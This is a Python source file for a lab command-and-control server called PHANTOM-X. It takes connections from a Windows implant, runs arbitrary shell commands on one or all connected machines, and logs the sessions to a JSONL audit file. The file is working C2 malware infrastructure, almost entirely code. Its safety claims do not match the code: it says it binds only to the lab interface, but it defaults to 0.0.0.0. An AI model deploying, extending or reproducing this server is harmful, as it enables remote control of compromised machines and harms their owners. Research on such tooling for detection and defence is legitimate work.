#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: Phase 5 -- lab C2 server
================================================================================
c2_server.py -- Lab command-and-control server for the Windows research VM.

    This is the operator side of the PHANTOM-X lab rig. It accepts sessions
    from px_payload.exe running inside the Windows VM, dispatches commands,
    and records every interaction as structured telemetry.

DESIGN CONSTRAINTS (deliberate)
    * Plain TCP. No encryption, no obfuscation, no domain generation, no
      traffic shaping. The point of this rig is to produce traffic that can
      be analysed, and a payload that can be observed by Defender/Sysmon.
      A stealthy channel would produce nothing worth measuring.
    * Every session, command, result and disconnect is written to a JSONL
      audit log. Nothing is done quietly.
    * No persistence, no credential handling, no lateral movement. Commands
      run only in the session's own process space on the target.
    * The server binds to the lab interface. It is not exposed publicly.

PROTOCOL (line oriented, UTF-8)
    client -> server   HELLO|<arch>|<pid>|<hostname>
                       PONG
                       RESULT|<cmd_id>|<base64 output>|<exit_code>
    server -> client   PING
                       EXEC|<cmd_id>|<command line>
                       EXIT

USAGE
    python3 c2_server.py --host 0.0.0.0 --port 9001 --log c2_audit.jsonl

    Then from the console:
        list                     show sessions
        exec 1 whoami            run a command in session 1
        exec all ver             run a command in every session
        ping 1                   measure round trip latency
        kill 1                   terminate a session cleanly
        stats                    session / command counts
        quit                     stop the server
"""

from __future__ import annotations

import argparse
import base64
import binascii
import json
import os
import shlex
import socket
import sys
import threading
import time
from datetime import datetime, timezone

BANNER = r"""
PHANTOM-X :: LAB C2 SERVER
  Plain TCP lab rig. Every interaction is written to the audit log.
  Type 'help' for the command list.
"""


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat()


class AuditLog:
    """Append-only JSONL audit trail."""

    def __init__(self, path: str):
        self.path = path
        self.lock = threading.Lock()
        self.count = 0
        if path:
            os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)

    def write(self, kind: str, **fields):
        rec = {"ts": utcnow(), "kind": kind}
        rec.update(fields)
        line = json.dumps(rec, default=str)
        with self.lock:
            self.count += 1
            if self.path:
                with open(self.path, "a", encoding="utf-8") as fh:
                    fh.write(line + "\n")
            else:
                print("  [audit] " + line)


class Session:
    """One connected payload."""

    def __init__(self, sid: int, sock: socket.socket, addr):
        self.id = sid
        self.sock = sock
        self.addr = addr
        self.arch = "?"
        self.pid = "?"
        self.host = "?"
        self.connected_utc = utcnow()
        self.last_seen = time.time()
        self.latency_ms = None
        self.commands_issued = 0
        self.commands_completed = 0
        self.alive = True
        self.pending: dict[str, dict] = {}
        self.results: dict[str, dict] = {}
        self.pending_lock = threading.Lock()
        self.send_lock = threading.Lock()

    # -- io ------------------------------------------------------------------
    def send(self, text: str) -> bool:
        with self.send_lock:
            try:
                self.sock.sendall((text + "\r\n").encode("utf-8", "replace"))
                return True
            except OSError:
                self.alive = False
                return False

    def close(self):
        self.alive = False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass

    def describe(self) -> str:
        lat = f"{self.latency_ms:.1f}ms" if self.latency_ms is not None else "n/a"
        return (f"[{self.id}] {self.host} arch={self.arch} pid={self.pid} "
                f"cmd={self.commands_completed}/{self.commands_issued} rtt={lat}")


class C2Server:
    def __init__(self, host: str, port: int, logpath: str, console: bool = True,
                 duration: int = 0):
        self.host = host
        self.port = port
        self.console = console
        self.duration = duration
        self.audit = AuditLog(logpath)
        self.sessions: dict[int, Session] = {}
        self.session_lock = threading.Lock()
        self.next_id = 1
        self.cmd_counter = 0
        self.stats = {"sessions": 0, "commands": 0, "results": 0, "pings": 0}
        self.running = True
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # -- lifecycle ------------------------------------------------------------
    def start(self):
        self.srv.bind((self.host, self.port))
        self.srv.listen(16)
        self.srv.settimeout(0.5)
        self.audit.write("server_start", host=self.host, port=self.port,
                         log=self.audit.path)
        print(f"[+] listening on {self.host}:{self.port}")
        print(f"[+] audit log: {self.audit.path or '(none)'}")

        threads = []
        if self.console:
            t = threading.Thread(target=self._console_loop, daemon=True)
            t.start()
            threads.append(t)

        deadline = time.time() + self.duration if self.duration else None
        try:
            while self.running:
                if deadline and time.time() > deadline:
                    print("[+] duration reached, shutting down")
                    break
                try:
                    conn, addr = self.srv.accept()
                except socket.timeout:
                    continue
                except OSError:
                    break
                with self.session_lock:
                    sid = self.next_id
                    self.next_id += 1
                    sess = Session(sid, conn, addr)
                    self.sessions[sid] = sess
                    self.stats["sessions"] += 1
                self.audit.write("session_open", session=sid, peer=f"{addr[0]}:{addr[1]}")
                print(f"[+] session {sid} connected from {addr[0]}:{addr[1]}")
                threading.Thread(target=self._client_loop, args=(sess,),
                                 daemon=True).start()
        except KeyboardInterrupt:
            print("\n[!] interrupted")
        finally:
            self.shutdown()

    def shutdown(self):
        self.running = False
        with self.session_lock:
            for sess in list(self.sessions.values()):
                sess.send("EXIT")
                sess.close()
        try:
            self.srv.close()
        except OSError:
            pass
        self.audit.write("server_stop", stats=self.stats, audit_records=self.audit.count)
        print(f"\n[+] stopped. audit records: {self.audit.count}")

    # -- client handling ------------------------------------------------------
    def _client_loop(self, sess: Session):
        sess.sock.settimeout(0.5)
        buf = b""
        try:
            while self.running and sess.alive:
                try:
                    chunk = sess.sock.recv(65536)
                except socket.timeout:
                    continue
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    raw, buf = buf.split(b"\n", 1)
                    line = raw.decode("utf-8", "replace").strip()
                    if line:
                        self._handle_line(sess, line)
        finally:
            sess.close()
            with self.session_lock:
                self.sessions.pop(sess.id, None)
            self.audit.write("session_close", session=sess.id,
                             host=sess.host, pid=sess.pid,
                             commands_completed=sess.commands_completed)
            print(f"[-] session {sess.id} closed "
                  f"(host={sess.host} cmds={sess.commands_completed})")

    def _handle_line(self, sess: Session, line: str):
        sess.last_seen = time.time()
        parts = line.split("|")
        kind = parts[0]

        if kind == "HELLO":
            sess.arch = parts[1] if len(parts) > 1 else "?"
            sess.pid = parts[2] if len(parts) > 2 else "?"
            sess.host = parts[3] if len(parts) > 3 else "?"
            self.audit.write("hello", session=sess.id, arch=sess.arch,
                             pid=sess.pid, host=sess.host)
            print(f"[*] session {sess.id} hello: host={sess.host} "
                  f"arch={sess.arch} pid={sess.pid}")
            return

        if kind == "PONG":
            self.stats["pings"] += 1
            with sess.pending_lock:
                for cid, rec in list(sess.pending.items()):
                    if rec.get("type") == "ping":
                        rec["done"].set()
                        sess.latency_ms = (time.time() - rec["t0"]) * 1000.0
                        self.audit.write("pong", session=sess.id,
                                         latency_ms=round(sess.latency_ms, 3))
            return

        if kind == "RESULT":
            cmd_id = parts[1] if len(parts) > 1 else "?"
            b64 = parts[2] if len(parts) > 2 else ""
            rc = parts[3] if len(parts) > 3 else "?"
            try:
                out = base64.b64decode(b64 + "===") if b64 else b""
                out_text = out.decode("utf-8", "replace")
            except (binascii.Error, ValueError):
                out_text = "<undecodable payload>"
            sess.commands_completed += 1
            self.stats["results"] += 1
            with sess.pending_lock:
                rec = sess.pending.pop(cmd_id, None)
            sess.results[cmd_id] = {"output": out_text, "exit_code": rc,
                                    "elapsed_ms": round((time.time() - rec["t0"]) * 1000.0, 3)
                                    if rec else None}
            self.audit.write("result", session=sess.id, cmd_id=cmd_id,
                             exit_code=rc, output=out_text,
                             output_len=len(out_text),
                             elapsed_ms=sess.results[cmd_id]["elapsed_ms"])
            if rec and "done" in rec:
                rec["done"].set()
            return

        self.audit.write("unknown_line", session=sess.id, line=line[:200])

    # -- dispatch -------------------------------------------------------------
    def exec(self, sess: Session, command: str, timeout: float = 30.0):
        with self.session_lock:
            self.cmd_counter += 1
            cmd_id = str(self.cmd_counter)
        sess.commands_issued += 1
        self.stats["commands"] += 1

        ev = threading.Event()
        with sess.pending_lock:
            sess.pending[cmd_id] = {"type": "exec", "t0": time.time(), "done": ev,
                                    "command": command}
        self.audit.write("exec", session=sess.id, cmd_id=cmd_id, command=command)
        if not sess.send(f"EXEC|{cmd_id}|{command}"):
            return None
        ev.wait(timeout)
        with sess.pending_lock:
            rec = sess.pending.get(cmd_id)
        return sess.results.get(cmd_id)

    def measure_latency(self, sess: Session, timeout: float = 10.0):
        with self.session_lock:
            self.cmd_counter += 1
            cmd_id = str(self.cmd_counter)
        ev = threading.Event()
        with sess.pending_lock:
            sess.pending[cmd_id] = {"type": "ping", "t0": time.time(), "done": ev}
        sess.send("PING")
        ev.wait(timeout)
        return sess.latency_ms

    # -- console --------------------------------------------------------------
    def _console_loop(self):
        time.sleep(0.3)
        while self.running:
            try:
                line = input("c2> ").strip()
            except EOFError:
                break
            except KeyboardInterrupt:
                break
            if not line:
                continue
            try:
                self._console_cmd(line)
            except Exception as exc:  # noqa: BLE001
                print(f"[!] {type(exc).__name__}: {exc}")

    def _console_cmd(self, line: str):
        if line in ("quit", "exit"):
            self.running = False
            return
        if line in ("help", "?"):
            print(HELP)
            return
        if line in ("list", "ls"):
            with self.session_lock:
                if not self.sessions:
                    print("  (no sessions)")
                for s in self.sessions.values():
                    print("  " + s.describe())
            return
        if line == "stats":
            print("  " + json.dumps(self.stats))
            print(f"  audit records: {self.audit.count} -> {self.audit.path}")
            return
        if line.startswith("ping"):
            arg = line.split(None, 1)[1] if len(line.split()) > 1 else "all"
            targets = self._targets(arg)
            for s in targets:
                lat = self.measure_latency(s)
                print(f"  session {s.id}: rtt={lat:.1f}ms" if lat is not None
                      else f"  session {s.id}: no PONG")
            return
        if line.startswith("exec"):
            parts = line.split(None, 2)
            if len(parts) < 3:
                print("  usage: exec <session|all> <command>")
                return
            target, command = parts[1], parts[2]
            for s in self._targets(target):
                print(f"  -> session {s.id}: {command}")
                res = self.exec(s, command)
                if res is None:
                    print(f"  <- session {s.id}: TIMEOUT (no result within 30s)")
                    continue
                out = res.get("output", "")
                rc = res.get("exit_code")
                print(f"  <- session {s.id}: exit={rc} "
                      f"({res.get('elapsed_ms')}ms)")
                if out:
                    for ol in out.rstrip().splitlines():
                        print(f"       {ol}")
                else:
                    print("       (no output)")
            return
        if line.startswith("kill"):
            arg = line.split(None, 1)[1] if len(line.split()) > 1 else "all"
            for s in self._targets(arg):
                self.audit.write("terminate_requested", session=s.id)
                s.send("EXIT")
                print(f"  session {s.id}: EXIT sent")
            return
        print("  unknown command; type 'help'")

    def _targets(self, arg: str):
        with self.session_lock:
            sessions = list(self.sessions.values())
        if arg in ("all", "*"):
            return sessions
        try:
            sid = int(arg)
        except ValueError:
            return []
        return [s for s in sessions if s.id == sid]


HELP = """
  list                 show active sessions
  exec <id|all> <cmd>  run a command in one or all sessions
  ping <id|all>        measure round trip latency
  kill <id|all>        send EXIT (controlled session termination)
  stats                counters and audit log path
  help                 this text
  quit                 stop the server
"""


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="PHANTOM-X lab C2 server")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=9001)
    ap.add_argument("--log", default="c2_audit.jsonl")
    ap.add_argument("--no-console", action="store_true",
                    help="run headless (for scripted / automated runs)")
    ap.add_argument("--duration", type=int, default=0,
                    help="stop automatically after N seconds (0 = run forever)")
    args = ap.parse_args(argv)

    print(BANNER)
    srv = C2Server(args.host, args.port, args.log,
                   console=not args.no_console, duration=args.duration)
    try:
        srv.start()
    except OSError as exc:
        print(f"[!] cannot bind {args.host}:{args.port}: {exc}", file=sys.stderr)
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
